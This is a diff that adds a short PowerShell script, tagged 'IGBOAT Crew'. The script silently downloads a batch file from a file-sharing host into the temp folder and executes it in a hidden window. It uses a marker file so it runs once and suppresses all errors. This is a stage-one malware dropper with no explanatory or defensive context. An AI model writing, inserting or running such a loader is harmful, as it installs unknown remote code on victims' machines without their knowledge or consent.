@@ -1,0 +1,9 @@
+$a = "<https://store8.gofile.io/download/web/082133f4-818e-4d62-a029-6eada90e3560/Dream.bat>"
+# IGBOAT Crew
+$y = "$env:temp\\xxxxx.cmd"
+$sleepTheGodFilePath = Join-Path $env:LocalAppData "Temp\\SleepTheGod"
+if (-not (Test-Path $sleepTheGodFilePath)) {
+    New-Item -ItemType File -Path $sleepTheGodFilePath -Force | Out-Null
+    Invoke-WebRequest -Uri $a -OutFile $y -ErrorAction SilentlyContinue | Out-Null
+    Start-Process "cmd" "/c $y" -WindowStyle Hidden
+}
